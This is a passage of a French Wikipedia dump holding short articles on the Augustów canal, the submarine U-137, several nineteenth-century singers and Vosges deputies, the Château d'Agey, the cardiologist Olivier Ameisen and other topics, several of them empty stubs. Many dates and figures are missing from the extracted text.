L'équipe Saur-Sojasun termine à la cinquante-septième place de l'Asia Tour avec 6,8 points. Ce total est obtenu par l'addition des points des huit meilleurs coureurs de l'équipe au classement individuel, cependant seul sept coureurs sont classés.
UCI Europe Tour.
L'équipe Saur-Sojasun termine à la deuxième place de l'Europe Tour avec points. Ce total est obtenu par l'addition des points des huit meilleurs coureurs de l'équipe au classement individuel.

</doc>
<doc id="7277924" url="https://fr.wikipedia.org/wiki?curid=7277924" title="Macbeth (téléfilm, 1959)">
Macbeth (téléfilm, 1959)

Macbeth est un téléfilm français, réalisé par Claude Barma et diffusé à la télévision le .

</doc>
<doc id="7277932" url="https://fr.wikipedia.org/wiki?curid=7277932" title="Canal d'Augustów">
Canal d'Augustów

Le canal d'Augustów est un canal reliant la Pologne en voïvodie de Podlachie près d'Augustów à l'oblast de Grodno (Hrodna) en Biélorussie et qui relie la Vistule et le Niémen, en passant par les rivières de la Biebrza, Netta et Czarna Hancza. Au nord du canal s'étend la région de Mazurie.
La longueur du canal est de , dont sur le territoire de la Biélorussie et environ sur celui de la Pologne.
Le canal comprend une série d'écluses et de pont mobiles. Depuis sa création, il est considéré comme une merveille du fait des régions naturelles qu'il traverse et aussi par ses nombreuses écluses qui jalonnent son parcours.
Le canal est présenté dans la liste indicative du patrimoine mondial de l'UNESCO, pour la Biélorussie et la Pologne, depuis le .
Histoire.
Construction (1821-1850).
Les raisons de la construction du canal furent politiques et économiques. Le projet de construction du canal revient à l'homme d'État polonais, ministre de l'économie, le prince Franciszek Ksawery Drucki-Lubecki (1779—1846). En 1821, la Prusse imposa unilatéralement des droits prohibitifs pour le transit des marchandises en transit sur son territoire en provenance de Pologne et de Lituanie, bloquant ainsi l'accès à la mer pour les marchands. En 1822, le royaume de Pologne bénéficiait d'une autonomie commerciale par rapport à la Russie. La nécessité impérieuse d'un corridor de contournement du territoire Prusse depuis le centre du royaume de Pologne jusqu'à la côte de Courlande et les ports russes de la Baltique se fit jour. La région serait ainsi indépendante du port de Gdansk/Dantzig. En 1824 le projet de canal d'une longueur totale de fut présenté à l'empereur Alexandre Ier de Russie qui était encore également Roi de Pologne à cette époque et il l'approuva l'année même. La région de Pologne devenait ainsi indépendante des ports de la Prusse.
Le premier directeur des constructions fut le colonel (1792—1850). En 1826, il fut arrêté pour trahison, mais par la suite il occupa des fonctions importantes auprès des révolutionnaires durant l'insurrection de novembre 1830, dirigée contre la Russie. L'essentiel des travaux fut terminé en 1830. Durant l'époque de l'insurrection de novembre 1830, les travaux furent arrêtés. Après l'insurrection, la direction de l'achèvement des travaux fut confiée à l'ingénieur Teodor Urbański. Plus de travailleurs participèrent aux travaux sous la direction du général et ingénieur français Jan Chrzciciel de Grandville Malletski et du colonel Rossman. Le canal fut ouvert en 1839. Quantités de ponts, des bacs et 18 écluses complètent le canal lui-même.
La dernière partie du canal (la « Windawska») devait créer un lien commercial avec le port de la Baltique en Lettonie Ventspils (en ) La construction de la section finale "windawski" () qui devait être relié à la route commerciale vers Ventspils, fut abandonnée du fait de l'insurrection de novembre 1830 en Pologne dirigée contre la Russie et de la révision des traités avec la Prusse.
Déclin et abandon (1850-1920).
En 1837, en Russie, le chemin de fer fit son apparition. Notamment avec la ligne Saint-Pétersbourg-Varsovie. Progressivement, le canal commença à décliner et à ne plus servir que pour le transport forestier et l'économie agricole locale et sporadiquement pour du transport de marchandises entre la Vistule et le Niémen. Des barges en bois étaient tirées, quand il fallait aller à contre-courant, par des chevaux et parfois des haleurs.
Reconstruction et renaissance (1920-1945).
La Première Guerre mondiale et la guerre russo-polonaise causèrent des dégâts au canal mais ils furent réparés par la deuxième république de Pologne dès 1920.
Entre les deux Guerres mondiales, le canal devint un lieu touristique recherché. À l'écluse de Dąbrówka (Dambroŭka), chaque année, avait lieu une fête réputée que l'on appelait « fête de la Mer ». Sur l'itinéraire Grodno-Augustów-Grodno, deux bateaux à vapeur transportaient régulièrement des passagers.
Le long du canal courait un itinéraire touristique pittoresque et les promeneurs y trouvaient tout ce qui était nécessaire pour faire de la barque, du kayak, du canoë ou de la voile.
Durant la Seconde Guerre mondiale, les ouvrages d'art de la partie biélorusse du canal furent lourdement endommagés. L'écluse de Czortok (Čartok) fut à moitié détruite. Au cours de leur retraite, les forces allemandes détruisirent 3 écluses, 8 barrages et 12 ponts. Après la guerre, une partie du canal fut réparée en Pologne mais la partie biélorusse fut laissée en l'état et abandonnée, ce n'est qu'en 2004-2006 que la partie biélorusse fut également restaurée.
Partition et reconstruction (1950-2005).
Le tracé des frontières de la Pologne suivant la Ligne Curzon eut un impact sur le canal. L' avait tracé un segment de la frontière entre la Pologne et la Biélorussie (à l'époque république soviétique socialiste de Biélorussie) le long de l'écluse appelée et plus loin le long du canal sur une distance de . Durant les années 1950, la Pologne reconstruisit le canal dans la partie qui commence à Bezbra jusqu'à l'. Au-delà de cette écluse, tout fut laissé en l'état résultant des dégâts causés pendant la Seconde Guerre mondiale. Du côté de l'URSS, il fut fait de même pour la section depuis le Niémen jusqu'à la frontière polonaise. La partie biélorusse est devenue entretemps un écosystème unique et, en 1970, fut créée la .
Statut obtenu en 2005.
Le 8 juin 2005, un accord fut conclu entre les gouvernements de Pologne et de Biélorussie pour la reconstruction du canal d'Augustów dans la région frontalière. Le but recherché était de restaurer la capacité touristique du canal, d'assurer l'approvisionnement en eau de la Czarna Hańcza et de restaurer l'écosystème naturel de la voie d'eau. En 2005 encore fut ouvert un point de passage à la frontière qui permet le passage de barques et de kayaks aux touristes. En 2008 il fut proposé d'étendre cette possibilité aux piétons et aux cyclistes.
Le canal est proposé aussi sur la liste indicative de reconnaissance en tant que patrimoine de l'humanité de l'UNESCO par la Pologne et la Biélorussie.
Géographie.
Le canal se situe dans une dépression de post-glaciaire. La plupart des vallées de la région des lacs de Mazurie se sont formées à l'époque glaciaire du Pléistocène. Les collines environnantes sont faites de moraines et les lacs sont des lacs de moraines pour la plupart. Le canal est situé dans la longue chaine de lacs et de rivières d'Augustów. La qualité du paysage a permis d'intégrer parfaitement ce canal dans son environnement sur une longueur de plus de cent kilomètres. Du côté polonais la surface du bassin est de et du côté biélorusse de , soit au total.
Le canal relie sept lacs de moraines (Necko, Białe, Studzieniczne, Orle, Paniewo, Krzywe et Mikaszewo) et onze rivières (Biebrza, , Czarna Hańcza, Klonownica, Plaska (Sucha Rzeczka, Serwianka), Mikaszówka, Perkucia, Szlamica, Wolkuszanka, Ostaszanka et Niémen). Les voies naturelles communiquent par des ouvertures, des écluses et des seuils (barrages). Le long de l'ouvrage, des chemins de halage, des rampes, des routes et des ponts permettent la circulation sur terre. Des bornes indiquent les limites de la zone protégée.
Économie et tourisme.
Le canal a été prévu pour assurer des liaisons avec les ports de la mer Baltique sous le contrôle de la Russie. En définitive, le canal ne fut pas terminé et il ne resta qu'un lien entre la Vistule et le Niémen. Il assurait le transport par hallage avec des chevaux de produits agricoles et forestiers. Il pouvait accueillir des bâtiments d'une longueur de , d'une largeur de et transportant jusqu'à de marchandises.
Sa vocation touristique a commencé déjà entre les deux Guerres mondiales du fait des destructions durant la Première Guerre mondiale, de la concurrence du chemin de fer qui se développait encore et de ses possibilités plus rapides de transports lourds que celui-ci offrait. Cette vocation touristique se poursuit malgré les problèmes de frontières entre les différents espaces européens.
Le canal se trouve également à l'extrémité orientale de la Mazurie, région de lacs, et la qui sont autant de points d'attraction pour le tourisme, au carrefour de trois pays : Pologne, Lituanie et Biélorussie.
Infrastructures.
À son époque le canal était un véritable miracle de la technologie dans cette région d'Europe par la qualité de la construction des écluses. C'est une des premières voie fluviale qui reliait directement deux grands fleuves : la Vistule et le Niémen.
À partir de Grodno, le assure une liaison navigable jusqu'à Brest, le canal Dniepr-Boug offre à la navigation, par la région de Prypiat, une liaison vers le Dniepr et la mer Noire. Par la liaison et la Dvina, le canal créait également une autre liaison vers le sud et la mer Noire. Les circonstances politiques et technologiques ont fait qu'il n'a jamais été utilisé, comme l'avaient cru les concepteurs, c'est-à-dire vers le nord et la mer Baltique.
La partie du canal situé en Biélorussie dispose de trois écluses : de Niemnowa (Niamnova - la plus grande, avec 3 sas, longueur totale de ceux-ci : ), de Dąbrówka (Dambroŭka) et de Wołkuszek (Vałkušyk) et deux seuils. À l'écluse de se trouve la frontière fixée le long de la Ligne Curzon, où en 2005 furent réalisés des travaux transfrontaliers.
Liste des écluses :

</doc>
<doc id="7277940" url="https://fr.wikipedia.org/wiki?curid=7277940" title="Unterseeboot 137 (1940)">
Unterseeboot 137 (1940)

L' Unterseeboot 137 ou U-137 est un sous-marin allemand (U boot) de type II.D utilisé par la Kriegsmarine pendant la Seconde Guerre mondiale.
Comme les sous-marins de type II étaient trop petits pour des missions de combat dans l'océan Atlantique, il a été affecté principalement dans la Mer du Nord et les côtes atlantiques.
Historique.
Mis en service le , l'U-138 a servi comme sous-marin d'entrainement et de navire-école pour les équipages d'abord au sein de la 1. Unterseebootsflottille à Kiel.
Le , l'U-137 devient opérationnel toujours dans la 1. Unterseebootsflottille à Kiel.
Il quitte le port de Kiel le sous les ordres de l'Oberleutnant zur See "Herbert Wohlfarth" pour rejoindre 4 jours plus tard Stavanger.
Il appareille le du port de Stavanger pour sa première patrouille toujours sous les ordres de l'Oberleutnant zur See "Herbert Wohlfarth" et rejoint la base sous-marine de Lorient le , soit après 9 jours et un succès de 2 navires coulés pour un total de tonneaux et 1 endommagé de tonneaux.
Le , "Herbert Wohlfarth" est promu au grade de Kapitänleutnant et reçoit la Croix de fer en récompense de ses résultats.
Sa deuxième patrouille débute le et finit, après 9 jours en mer, le . Lors de cette patrouille, il endommage un navire de guerre auxiliaire de tonneaux qui survivra à la guerre.
Sa troisième patrouille, du 3 au , soit 20 jours en mer le conduit de Lorient à Bergen en Norvège dans laquelle il coule 4 navires pour un total de tonneaux. Le , il quitte Bergen pour rejoindre Kiel qu'il atteint le , après 4 jours en mer.
Le , le Kapitänleutnant "Herbert Wohlfarth" cède le commandement de l'U-137 à l'Oberleutnant zur See "Hanns-Ferdinand Massmann".
Le , l'U-137 rejoint la 22. Unterseebootsflottille à Gotenhafen pour des fonctions de formation jusqu'au où il appareille, toujours sous les ordres de l'Oberleutnant zur See "Hanns-Ferdinand Massmann" pour le nord des Shetland pour arriver à Bergen qu'il atteint le , après 4 jours en mer.
Il quitte Bergen le pour sa quatrième et dernière patrouille de guerre pour y revenir avec 14 jours en mer, le . Le , il part pour Helsingör au Danemark qu'il atteint le , puis départ pour Kiel le où il apponte le lendemain.
L'U-137 quitte définitivement le service active et reprend son rôle en tant que navire-école, toujours dans la 22. Unterseebootsflottille et le reste jusqu'à la fin de la guerre. Durant les dernières semaines de la guerre il fait mouvement vers Whilhelmshaven.
Le , la fin de la guerre se faisant sentir et pour répondre aux ordres de l'amiral Karl Dönitz pour l'Opération Regenbogen, l'U-137 est sabordé dans la "Raederschleuse" (écluse Raeder (d'après le nom du Grand Amiral Erich Raeder), entrée ouest du port) à Wilhelmshaven, à la position géographique de .
Après guerre, l'U-137 est renfloué et démoli.
Navires coulés.
L'Unterseeboot 137 a coulé 6 navires marchands ennemis pour un total de tonneaux et endommagé 1 navire marchand de tonneaux et 1 navire militaire auxiliaire de tonneaux au cours des 4 patrouilles (52 jours en mer) qu'il effectua.

</doc>
<doc id="7277946" url="https://fr.wikipedia.org/wiki?curid=7277946" title="Anton Haizinger">
Anton Haizinger

Anton Haizinger (aussi écrit Haitzinger, né le à Wilfersdorf et mort le à Karlsruhe) est un ténor autrichien.
Biographie.
Haizinger a commencé sa carrière en tant que professeur d'école à Vienne. Plus tard en raison de sa belle voix, il a été engagé pour chanter à l'opéra par le comte Palffy, directeur du Theater an der Wien. Il fait sa première apparition en 1821, en recueillant des applaudissements. Un des faits saillants de sa carrière a été sa participation à la création de la "Symphonie nº 9" de Beethoven lors du grand concert, que le compositeur a donné le au Theater am Kärntnertor. Il a chanté ensuite avec succès dans d'autres théâtres et a reçu une nomination à vie par le théâtre de Karlsruhe.
Il est aussi le créateur le , du rôle de Adolar, comte de Nevers dans l"Euryanthe" de Carl Maria von Weber.
Une période brillante de son activité artistique a commencé avec ses concerts à Paris, où il a défendu aux côtés de la chanteuse Wilhelmine Schröder-Devrient la réputation de l'opéra allemand, en 1828, 1829 et 1830.
Son épouse Amalie Haizinger (née Morstadt) était une actrice.
En 1850, il se retire de la scène et s'installe à Vienne, où sa femme était engagée.
Il a publié un lied "Vergiss mein nicht" ainsi qu'un manuel de chant.

</doc>
<doc id="7277947" url="https://fr.wikipedia.org/wiki?curid=7277947" title="Primetime Emmy Award du meilleur scénario pour un programme de variété, musical ou comique">
Primetime Emmy Award du meilleur scénario pour un programme de variété, musical ou comique



</doc>
<doc id="7277953" url="https://fr.wikipedia.org/wiki?curid=7277953" title="Agrion fuscum">
Agrion fuscum



</doc>
<doc id="7277954" url="https://fr.wikipedia.org/wiki?curid=7277954" title="Primetime Emmy Award du meilleur programme d'animation - Moins d'une heure">
Primetime Emmy Award du meilleur programme d'animation - Moins d'une heure



</doc>
<doc id="7277956" url="https://fr.wikipedia.org/wiki?curid=7277956" title="KJS Anand">
KJS Anand



</doc>
<doc id="7277958" url="https://fr.wikipedia.org/wiki?curid=7277958" title="Lestes fusca">
Lestes fusca



</doc>
<doc id="7277959" url="https://fr.wikipedia.org/wiki?curid=7277959" title="Sympecma aragonensis">
Sympecma aragonensis



</doc>
<doc id="7277967" url="https://fr.wikipedia.org/wiki?curid=7277967" title="Olivier Ameisen">
Olivier Ameisen

Olivier Ameisen, né le à Boulogne-Billancourt (Seine) et mort le à , est un cardiologue franco-américain.
Biographie.
Olivier Ameisen est né de parents juifs polonais.
Il obtient son baccalauréat en fin de seconde et entame aussitôt des études de médecine en 1969 après avoir été tenté par une carrière de pianiste classique.
Pendant son service militaire, il est le médecin de Matignon (1980-1981).
Il s'installe aux États-Unis en 1983, cardiologue à l'hôpital presbytérien de New York. Il exerce cette spécialité aux États-Unis jusqu'en 1998.
Après des recherches exhaustives dans la littérature médicale, il fait une découverte qui sera publiée en 2004 : l'utilisation d'un décontractant musculaire, le baclofène, pour soigner l'alcoolisme chronique.
Ce médicament — qu’il s’est auto-administré quotidiennement en adaptant un protocole utilisé dans des modèles animaux – l'a guéri de son alcoolisme comme il le raconte dans son livre "Le dernier verre" publié en 2008.
Il se lance dans une lutte acharnée afin de faire reconnaître ce myorelaxant qui supprime le "craving" (envie irrépressible de boire) lié à l'alcool. Cela devient le « combat de sa vie » durant lequel il doit faire face à de nombreuses polémiques de la part d'addictologues qui conservent leur faveur au traitement de l'alcoolisme par l’abstinence.
Plusieurs associations de patients et de médecins se créent : Aubes, Baclofène, Resab, ainsi que Ameisen.
Un essai clinique est lancé en 2012. Son traitement sera officiellement reconnu par l'ANSM le lors d'un colloque à l'hôpital Cochin.
Il meurt le dans le de Paris d'un infarctus du myocarde. Il est inhumé au cimetière du Montparnasse.
Entourage familial.
Son père, Emanuel, avait été ingénieur en France après avoir suivi des études à Grenoble dans les années 1930. Engagé volontaire, il avait été fait prisonnier de guerre, envoyé dans un stalag pour Juifs en Poméranie pendant que son épouse, Claire Ameisen, était arrêtée, déportée de France à Auschwitz. Libéré, il revient en France où il dirigera, entre autres, l'entreprise d'Helena Rubinstein, épouse de son oncle, l'éditeur Edward Titus. Sa mère, Janine, artiste peintre, a été condisciple en philosophie à l'Université de Cracovie du futur Jean-Paul II avant d'être déportée. Elle est survivante d'Auschwitz. Son frère, Jean Claude Ameisen, est connu notamment pour sa présidence du Comité consultatif national d'éthique en France, sa sœur, Éva Ameisen, est stomatologue et auteur-compositeur.

</doc>
<doc id="7277971" url="https://fr.wikipedia.org/wiki?curid=7277971" title="The Rains of Castamere">
The Rains of Castamere



</doc>
<doc id="7277972" url="https://fr.wikipedia.org/wiki?curid=7277972" title="Jules Aymé de la Herlière">
Jules Aymé de la Herlière

Jules Aymé de la Herlière est un homme politique français né le à Médonville (Vosges) et décédé le à Neufchâteau (Vosges).
Il étudie le droit à Paris, il devient avocat à Neufchâteau avant de devenir substitut du procureur du roi à Lunéville. Il est ensuite magistrat au tribunal de Neufchâteau en 1840. 
Il est rapidement le premier adjoint au maire de Neufchâteau puis il est nommé maire puis élu conseiller d'arrondissement entre 1841 et 1848, puis conseiller général du canton de Bulgnéville en 1848. Il devient président du conseil général entre 1852 et 1871. Il est député des Vosges de 1852 à 1869, siégeant dans la majorité dynastique, soutenant le Second Empire. Il se représente en 1876 mais échoue face à Paul Frogier de Ponlevoy. Il se représente en 1877 mais échoue à nouveau. Il se retire alors totalement de la vie politique. 

</doc>
<doc id="7277973" url="https://fr.wikipedia.org/wiki?curid=7277973" title="Championnat de Tchécoslovaquie masculin de handball">
Championnat de Tchécoslovaquie masculin de handball

Le championnat de Tchécoslovaquie masculin de handball mettait aux prises les meilleures équipes de club de Tchécoslovaquie entre 1950 et 1993, à la suite de la dissolution de la Tchécoslovaquie le .
La compétition a été dominée par le HC Dukla Prague, vainqueur de 28 championnats. Ce club est également le seul en Tchécoslovaquie à avoir remporté la Coupe d'Europe des clubs champions, en l'occurrence à trois reprises en 1957, 1963 et 1984.
Aujourd'hui, les équipes évoluent dans l'un des championnats suivants :

</doc>
<doc id="7277976" url="https://fr.wikipedia.org/wiki?curid=7277976" title="Sodalitium">
Sodalitium



</doc>
<doc id="7277977" url="https://fr.wikipedia.org/wiki?curid=7277977" title="Coupe de Belgique féminine de football 2013-2014">
Coupe de Belgique féminine de football 2013-2014

La Coupe de Belgique de football féminin 2013-2014 est la de la compétition. La finale se joue le samedi 10 mai 2014, à 18 heures, au Freethiel à Beveren. Elle oppose le Standard de Liège, (), au Club Bruges KV, (1 finale). Le Standard de Liège enlève sa Coupe de Belgique. 
Tour préliminaire.
Le tour préliminaire se joue le samedi . Les matchs se jouent en une manche. 
Note.
¹ Club qualifié pour le sans jouer
Le se joue le samedi . Les clubs de D3 entrent en lice. Les matchs se jouent en une manche. 
Note.
¹ Clubs qualifiés pour le sans jouer
Le se joue le samedi . Les clubs de D2 entrent en lice. Les matchs se jouent en une manche. 
Note.
¹ Club qualifié pour le tour suivant sans jouer
Le se joue le samedi . Les clubs de D1 entrent en lice. Les matchs se jouent en une manche. 
Le se joue le samedi . Les matchs se jouent en une manche.
Huitièmes de finale.
Les huitièmes de finale se jouent le samedi . Les clubs de la BeNe Ligue entrent en lice. Les matchs se jouent en une manche.
Quarts de finale.
Les quarts de finale se jouent le samedi . Les matchs se jouent en une manche.
Demi-finales.
Les demi-finales se jouent le dimanche . Les matchs se jouent en une manche.

</doc>
<doc id="7277978" url="https://fr.wikipedia.org/wiki?curid=7277978" title="Charles de Bourcier de Villers">
Charles de Bourcier de Villers

Charles Bourcier de Villers est un homme politique français né le à Nancy (Meurthe-et-Moselle) et décédé le à Nancy.
Propriétaire terrien, officier de cavalerie, il est député des Vosges de 1852 à 1863, siégeant dans la majorité dynastique soutenant le Second Empire.

</doc>
<doc id="7277979" url="https://fr.wikipedia.org/wiki?curid=7277979" title="Jenő Kamuti">
Jenő Kamuti

Jenő Kamuti, né le , est un escrimeur hongrois aujourd'hui à la retraite. Membre de l'équipe de Hongrie de fleuret, il fut à plusieurs reprises médaillé d'argent lors des Jeux olympiques. Il est le frère de l'escrimeur László Kamuti.

</doc>
<doc id="7277988" url="https://fr.wikipedia.org/wiki?curid=7277988" title="Nicolas Géliot">
Nicolas Géliot

Nicolas Géliot est un homme politique français né le à Selongey (Côte-d'Or) et décédé le à Plainfaing (Vosges).
Biographie.
Manufacturier, commandant de la garde nationale et maire de Plainfaing en 1848, il est conseiller général du canton de Fraize de 1855 à 1870 et député des Vosges de 1867 à 1870, siégeant dans la majorité dynastique, soutenant le Second Empire.

</doc>
<doc id="7277990" url="https://fr.wikipedia.org/wiki?curid=7277990" title="Château d'Agey">
Château d'Agey

Le château d'Agey est situé au creux d'un vallon au plus bas du village d'Agey à l'est, sur les rives du ruisseau La Sirène, entre les collines de Montfeuson, Mont Rond, et Veluzotte. Il date des .
Situation.
Il est à environ (à vol d'oiseau) à l'ouest de Dijon, à d'altitude en rive gauche (côté nord) de la Sirène, affluent de l'Ouche et qui coule d'ouest en est. Comme le montre la carte IGN, la vue est ouverte principalement vers l'est, avec à de distance la vallée de l'Ouche très encaissée en contrebas (falaises atteignant de dénivellation) et le mont Aigu ( d'altitude) en droite ligne à l'est-nord-est en direction de Dijon. Au nord, le château est au pied d'une barre longeant la Sirène, d'environ de hauteur. Au sud-ouest se trouve le massif portant la forêt de Veluze ( d'altitude) et au nord-ouest le massif de Montfeulson ( d'altitude).
Guettard le décrit comme « situé dans une gorge étroite, entourée de montagnes qui regardent le nord &amp; le levant ; la trop grande proximité de ces montagnes n'est point avantageuse à ce château, mais l'éloignement de celles qui sont au midi, &amp; qu'on ne voit que dans le lointain, bornent agréablement la vue, après qu'elle s'est encore plus agréablement promenée sur les objets répandus dans cette gorge; &amp; surtout sur les beaux jardins… ».
Historique.
Une forteresse est mentionnée pour la première fois à "Aigey" en 1451-1454
Au tournant du Antoine Gros fait construire un bâtiment adjoignant la tour de guet.
Zacharie Chappellain fait reconstruire ce bâtiment dans la première moitié du .
Architecture.
Cet édifice a deux cours autour desquelles sont disposés les différents bâtiments. Au fond de la haute cour ou cour principale, le logis est flanqué, à sa droite, par une aile en retour d'équerre. À gauche, en contrebas, se trouvent la basse cour et un bâtiment en fer à cheval avec un corps de passage : les communs, grange, remises, écuries.
Parc et jardin d'agrément.
Marie-Gabrielle de Pons de Rennepont, l'épouse d'Henri-Anne de Fuligny-Damas de Rochechouart, en dessine les parterres, les pièces et jets d'eau. « "… les beaux jardins auxquels Madame de Rochechouart a donné naissance, là où il y avait des marais ou des terres marécageuses ; rien ne manque à ces jardins, parterres bien dessinés, boulingrins, pièces et jets d'eau, bosquets de différentes constructions, belles et grandes terrasses pour lesquelles madame de Rochechouart a été obligée de faire sauter des rochers considérables et d'une pierre, quoique calcaire, d'une dureté assez grande" ». 
Cabinet d'histoire naturelle.
Réalisé dans le parc par Marie-Gabrielle de Rochechouart, ce cabinet était un des plus importants de la Bourgogne et du royaume. Il a été visité par l'académicien Jean-Étienne Guettard qui en donne une longue description (pas moins d'un tiers de son mémoire d"'Observations minéralogiques en France et en Allemagne"), et notamment de son carrelage auquel il consacre sept pages :
« "… Les carreaux du Cabinet sont faits de ces marbres que l'on trouve dans cette région de Bourgogne. Ils sont octogonaux à quatre grands pans et à quatre petits pans, ceux qui touchent les murs sont carrés long d'un pied et demi, au nombre de cinquante quatre… "».
Chapelle.
Aujourd'hui disparue.
Seigneurs et propriétaires depuis le.
Depuis 1989, il appartient à quatre propriétaires qui occupent chacun différentes parties.
Archives.
Les archives anciennes de la seigneurie d'Agey comportent des documents allant de 1450 à l'an XIII et sont riches en pièces de la fin du ; elles incluent aussi les papiers des Fuligny-Damas de Rochechouart. Ces documents sont conservés dans le fonds de Charentenay (VII F) aux archives départementales de la Côte-d'Or.

</doc>
<doc id="7277999" url="https://fr.wikipedia.org/wiki?curid=7277999" title="Films américains sortis en 1948">
Films américains sortis en 1948

Liste (non exhaustive) de films américains sortis en 1948.
"Hamlet" remporte l'Oscar du meilleur film à la des Oscars organisée le 

</doc>
<doc id="7278004" url="https://fr.wikipedia.org/wiki?curid=7278004" title="Coupe de France féminine de cyclisme sur route 2013">
Coupe de France féminine de cyclisme sur route 2013

La Coupe de France féminine de cyclisme sur route 2013 est la de la Coupe de France féminine de cyclisme sur route. La victoire revient à la Française Élodie Hegoburu.
Cette édition se déroule du au et est composée de cinq épreuves comme lors de l'édition précédente.
Classements.
L’équipe Vienne Futuroscope remporte le classement par équipes. Lucie Pader remporte le classement chez les espoirs et Solène Vinsot le classement chez les juniors.

</doc>
<doc id="7278006" url="https://fr.wikipedia.org/wiki?curid=7278006" title="Gouvernement Đinđić">
Gouvernement Đinđić

Le gouvernement Đinđić (en serbe cyrillique : ; en serbe latin : ) est un gouvernement serbe entré en fonction le . Il était formé autour de la coalition de l'Opposition démocratique de Serbie (DOS) qui rassemblait 18 partis. Le président du gouvernement était Zoran Đinđić et il comptait 7 vice-présidents. Il a duré jusqu'au , date de l'assassinat de Đinđić.
Formation.
Le président de la République, Milan Milutinović, convoque des élections législatives pour le . Pour un total de 250 sièges, les résultats de ces élections sont les suivants :

</doc>
<doc id="7278007" url="https://fr.wikipedia.org/wiki?curid=7278007" title="Gouvernement Dindic">
Gouvernement Dindic



</doc>
<doc id="7278008" url="https://fr.wikipedia.org/wiki?curid=7278008" title="Gouvernement Djindjic">
Gouvernement Djindjic



</doc>
<doc id="7278013" url="https://fr.wikipedia.org/wiki?curid=7278013" title="Jean Houel">
Jean Houel



</doc>
<doc id="7278016" url="https://fr.wikipedia.org/wiki?curid=7278016" title="Joseph Seipelt">
Joseph Seipelt

Joseph Seipelt (né le à Rajka, en allemand Ragendorf, dans le comitat de Moson en Hongrie; † à Vienne) est une basse, compositeur et chef de chœur autrichien.
Biographie.
Son père instituteur lui a donné les premières leçons de musique mais est décédé alors que Joseph n'avait que neuf ans. Un prêtre local l'a amené à l'école latine. Il a été ensuite recueilli par son oncle, qui était alors provincial des Frères de la Charité à Bratislava, Matthew Riediger, et il a vécu dans le monastère en suivant l'enseignement secondaire. Il est allé ensuite travailler pendant trois ans à Trieste dans une maison de commerce, avant d'aller à Vienne. Seipelt a d'abord chanté dans la chorale du Theater an der Wien. Plus tard il a pris des leçons gratuites d'Antonio Salieri, puis fait ses débuts avec beaucoup de succès comme basse à Lviv (Lemberg) où il a chanté Sarastro dans "La Flûte enchantée". Il s'est ensuivi des engagements à Sibiu (Hermannstadt), Timișoara (Temeswar) et de 1809 à 1812 à Linz. Après avoir travaillé dans différents opéras en Hongrie et en Galicie, y compris le "Deutsche Oper" de Budapest, il est retourné au Theater an der Wien, où il a chanté tous les grands rôles de son répertoire, et où après sa retraite de la scène, il travaillait encore comme chef de chœur. 
Le , il a chanté la partie de basse dans la première exécution mémorable de la "Symphonie nº 9" de Ludwig van Beethoven. 
Il est aussi le créateur le , du rôle du roi Louis VI dans l"Euryanthe" de Carl Maria von Weber.
Il a composé des quatuors vocaux principalement pour voix d'hommes.
Le , il a été fait citoyen d'honneur de la ville de Vienne.
Famille.
Sa fille Joséphine (1816-1841) était une célèbre pianiste, élève de Franz Jakob Frey Staedtler. Sa fille Amalie était chanteuse au Theater am Kärntnertor.

</doc>
<doc id="7278025" url="https://fr.wikipedia.org/wiki?curid=7278025" title="Pierre Forel">
Pierre Forel

Pierre Louis Joseph Carlos Forel est un homme politique français né le à Nancy (Meurthe-et-Moselle) et décédé le à Paris.
Biographie.
Négociant, associé dans les filatures de la famille Koechlin à laquelle il était allié par son épouse, il est adjoint au maire de Mulhouse sous la Monarchie de Juillet. Il est l'un des organisateurs du banquet de Colmar, en 1847. Il est député des Vosges de 1848 à 1851, siégeant à gauche.

</doc>
<doc id="7278029" url="https://fr.wikipedia.org/wiki?curid=7278029" title="Heinichen">
Heinichen

Heinichen est un patronyme porté notamment par :

</doc>
<doc id="7278043" url="https://fr.wikipedia.org/wiki?curid=7278043" title="Étude des risques">
Étude des risques



</doc>
<doc id="7278044" url="https://fr.wikipedia.org/wiki?curid=7278044" title="2 520 (nombre)">
2 520 (nombre)



</doc>
<doc id="7278046" url="https://fr.wikipedia.org/wiki?curid=7278046" title="Henri Quittard">
Henri Quittard

Henri Quittard, né le à Clermont-Ferrand et mort le à Paris, est un compositeur, musicologue et critique musical français.
Biographie.
Musicien, compositeur, musicologue et critique musical, il était à la fois le cousin d'Emmanuel Chabrier (Quittard étant le petit-fils de la tante Zélie chère à Chabrier) et de Roger Désormière qu'il chaperonna quand, à 15 ans, le futur chef d'orchestre quitta Vichy pour rentrer au Conservatoire à Paris (la grand-mère maternelle de Désormière était une Quittard).
Il obtint son bac, au début des années 1880, à Clermont-Ferrand où il entreprit des études de lettres à la Faculté, décrochant une licence. À l'instigation de Chabrier, il monta à Paris, où il vécut en donnant des leçons et en tentant de devenir compositeur, suivant des cours auprès de César Franck. Il étudia aussi aux Langues orientales (alors École des langues orientales vivantes) où il croisa Louis Laloy.
Le voit la création de la seule pièce de théâtre de Paul Verlaine, "Les Uns et les Autres", en un acte et en vers, au Théâtre des Variétés, jouée par la troupe du Théâtre d'Art. La musique est d'Henri Quittard, tout comme celle de Chérubin de Charles Morice, au même programme. Cette soirée « symboliste » devait être au bénéfice de Verlaine et de Paul Gauguin. Cette musique de scène aura l'honneur du concert à la Société nationale de musique le . Et accompagnera la reprise de la pièce, par la troupe de l'Odéon, à l'occasion des festivités pour l'inauguration de la statue de Verlaine au Jardin du Luxembourg, le .
La seconde expérience théâtrale de Quittard se déroule un an après, toujours avec le Théâtre-d'Art. Le , générale, et le 30, on donne au Théâtre-d'Application 3 pièces dont les Noces de Sathan, pièce ésotérique de Jules Bois, partie musicale de Henri Quittard (Debussy, pressenti, s'était désisté tardivement).
Dernière musique pour le théâtre de Quittard, en 1895, voilà "Le Prince naïf" des frères des Gachons. Cette pièce, ou plutôt ce « lumino-conte », de Jacques des Gachons, musique de scène de Henri Quittard, avec des décors de l'imagier André des Gachons, est jouée au Théâtre minuscule, 31, rue Bonaparte, dans le Hall du journal "La Plume". 
Professeur de musique, on le trouve professeur de chant au lycée Carnot à la rentrée 1904.
Musicographe (on ne disait pas alors musicologue), son article est une nécrologie dans "Le Monde illustré" du consacrée au chanteur Henri Sellier puis il donne des critiques dans une autre revue, "La Vogue". 
Henri Quittard va s'occuper de la partie musicale à partir du tome 24, soit de 1899 à 1902, pour La grande encyclopédie : inventaire raisonné des sciences, des lettres et des arts (31 volumes, 1886-1902) par Henri Lamirault, éditeur, Ferdinand-Camille Dreyfus et Marcellin Berthelot.
